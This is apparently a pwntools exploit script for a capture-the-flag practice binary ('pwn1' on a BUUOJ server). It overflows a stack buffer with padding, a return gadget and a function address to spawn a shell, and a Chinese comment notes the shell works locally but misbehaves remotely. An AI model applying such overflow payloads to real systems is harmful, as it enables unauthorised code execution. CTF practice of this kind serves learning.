from pwn import *

context(os='linux', arch='amd64')
if args.LOCAL:
    p = process('./pwn1')
else:
    p = remote('node3.buuoj.cn', 28598)

retn = 0x401198
fun_addr = 0x401186

# payload = b'a'*(0xf+0x8) + p64(fun_addr)
payload = b'a'*(0xf+0x8) + p64(retn) + p64(fun_addr)
# payload = b'a'*(15+8)+ p64(fun_addr)

p.sendline(payload)
# # print(p.recvline())

p.interactive()


'''
本地调试是可以获得shell的
所以应该是服务器的问题

payload = b'a'*23 + p64(retn) + p64(fun_addr)的话
会进入到一个奇怪的交互环境
执行ls命令会显示
: ls not found
'''


